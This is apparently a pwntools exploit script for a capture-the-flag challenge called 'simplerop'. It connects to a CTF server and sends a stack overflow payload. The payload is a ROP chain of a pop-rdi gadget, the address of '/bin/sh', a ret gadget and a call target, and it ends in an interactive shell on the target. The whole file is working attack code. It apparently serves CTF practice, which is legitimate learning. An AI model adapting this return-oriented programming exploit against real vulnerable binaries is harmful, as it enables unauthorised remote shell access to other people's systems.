#!/usr/bin/env python3

from pwn import *

exe = ELF("./simplerop-af22071fcb7a6df9175940946a6d45e5")

context.binary = exe


def conn():
        return process([exe.path])

def main():
    #r = conn()

    r = remote("chal.ctf.b01lers.com", 1008)
    
    r.recvline()

    PopRdi = p64(0x0000000000401273)
    pause()
    r.sendline(b"M"*8 + PopRdi + p64(next(exe.search(b"/bin/sh"))) + p64(0x000000000040101a) +p64(0x0000000000401080))

    r.interactive()


if __name__ == "__main__":
    main()
